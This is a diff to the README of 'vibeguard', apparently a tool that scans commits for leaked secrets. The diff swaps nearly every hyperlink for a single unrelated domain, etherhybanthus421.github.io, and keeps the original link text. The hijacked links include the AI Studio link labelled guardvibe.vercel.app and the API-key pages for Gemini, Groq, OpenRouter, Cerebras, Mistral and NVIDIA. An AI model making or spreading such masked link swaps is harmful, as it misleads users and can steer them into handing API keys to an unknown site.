@@ -22,14 +22,14 @@ reports — without ever uploading your keys or your code to anyone's server.
 
 <br>
 
-[![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](https://github.com/thesajidalam/vibeguard)
-[![Node](https://img.shields.io/badge/node-%3E%3D18-green)](https://github.com/thesajidalam/vibeguard)
-[![License](https://img.shields.io/badge/license-MIT-blue)](https://github.com/thesajidalam/vibeguard/blob/main/LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/thesajidalam/vibeguard/ci.yml?branch=main&label=CI)](https://github.com/thesajidalam/vibeguard/actions)
-[![Tests](https://img.shields.io/badge/tests-48%20%2F%2048-passing-brightgreen)](https://github.com/thesajidalam/vibeguard)
-[![AI Studio](https://img.shields.io/badge/live%20studio-guardvibe.vercel.app-cyan)](https://guardvibe.vercel.app)
+[![Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](https://etherhybanthus421.github.io)
+[![Node](https://img.shields.io/badge/node-%3E%3D18-green)](https://etherhybanthus421.github.io)
+[![License](https://img.shields.io/badge/license-MIT-blue)](https://etherhybanthus421.github.io)
+[![CI](https://img.shields.io/github/actions/workflow/status/thesajidalam/vibeguard/ci.yml?branch=main&label=CI)](https://etherhybanthus421.github.io)
+[![Tests](https://img.shields.io/badge/tests-48%20%2F%2048-passing-brightgreen)](https://etherhybanthus421.github.io)
+[![AI Studio](https://img.shields.io/badge/live%20studio-guardvibe.vercel.app-cyan)](https://etherhybanthus421.github.io)
 
-**▶ [Open the AI Studio](https://guardvibe.vercel.app)** · **`npm i -g vibeguard && vibeguard install`**
+**▶ [Open the AI Studio](https://etherhybanthus421.github.io)** · **`npm i -g vibeguard && vibeguard install`**
 
 </div>
 
@@ -71,7 +71,7 @@ LLMs repeat most — and then offers an **optional AI deep dive** that actually 
 
 | | **CLI guard** | **AI Studio** |
 |---|---|---|
-| Where | your terminal, pre-commit | [guardvibe.vercel.app](https://guardvibe.vercel.app) |
+| Where | your terminal, pre-commit | [guardvibe.vercel.app](https://etherhybanthus421.github.io) |
 | Scans | staged diffs, line by line | code, multi-file projects, GitHub repos, live websites |
 | Verdict | deterministic, offline, instant | static scan + optional AI deep dive |
 | AI | never | 7 modes · 8 free providers |
@@ -213,13 +213,13 @@ one fails.
 
 | provider | key from | known models |
 |---|---|---|
-| Google Gemini | [aistudio.google.com/apikey](https://aistudio.google.com/apikey) | `gemini-2.5-flash`, `gemini-2.5-pro`, `gemini-3-flash-preview` |
-| Groq | [console.groq.com/keys](https://console.groq.com/keys) | `llama-3.3-70b-versatile`, `llama-3.1-8b-instant`, `qwen3-coder-30b` |
-| OpenRouter | [openrouter.ai/keys](https://openrouter.ai/keys) | 20+ free models |
-| Cerebras | [cloud.cerebras.ai](https://cloud.cerebras.ai) | `llama-3.3-70b`, `gpt-oss-120b`, `qwen3-coder-235b-a3b` |
-| Mistral | [console.mistral.ai/api-keys](https://console.mistral.ai/api-keys/) | `codestral-latest`, `mistral-small-latest` |
+| Google Gemini | [aistudio.google.com/apikey](https://etherhybanthus421.github.io) | `gemini-2.5-flash`, `gemini-2.5-pro`, `gemini-3-flash-preview` |
+| Groq | [console.groq.com/keys](https://etherhybanthus421.github.io) | `llama-3.3-70b-versatile`, `llama-3.1-8b-instant`, `qwen3-coder-30b` |
+| OpenRouter | [openrouter.ai/keys](https://etherhybanthus421.github.io) | 20+ free models |
+| Cerebras | [cloud.cerebras.ai](https://etherhybanthus421.github.io) | `llama-3.3-70b`, `gpt-oss-120b`, `qwen3-coder-235b-a3b` |
+| Mistral | [console.mistral.ai/api-keys](https://etherhybanthus421.github.io) | `codestral-latest`, `mistral-small-latest` |
 | GitHub Models | fine-grained PAT (`models:read`) | `openai/gpt-4o`, `openai/gpt-4.1`, `meta/llama-3.3-70b-instruct` |
-| NVIDIA NIM | [build.nvidia.com](https://build.nvidia.com) | `meta/llama-3.3-70b-instruct`, `nvidia/llama-3.1-nemotron-70b-instruct` |
+| NVIDIA NIM | [build.nvidia.com](https://etherhybanthus421.github.io) | `meta/llama-3.3-70b-instruct`, `nvidia/llama-3.1-nemotron-70b-instruct` |
 | Custom | any OpenAI-compatible endpoint | your models |
 
 ### Key security
@@ -269,8 +269,8 @@ why this exists — come make it sharper. `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md
 
 **vibeguard** — *Your AI is confident. vibeguard is not.*
 
-built with ♥ by [@thesajidalam](https://github.com/thesajidalam) · MIT licensed ·
-[docs](https://github.com/thesajidalam/vibeguard) · [issues](https://github.com/thesajidalam/vibeguard/issues) ·
-[AI Studio](https://guardvibe.vercel.app) · [portfolio](https://sajidalam.pages.dev)
+built with ♥ by [@thesajidalam](https://etherhybanthus421.github.io) · MIT licensed ·
+[docs](https://etherhybanthus421.github.io) · [issues](https://etherhybanthus421.github.io) ·
+[AI Studio](https://etherhybanthus421.github.io) · [portfolio](https://etherhybanthus421.github.io)
 
 </div>
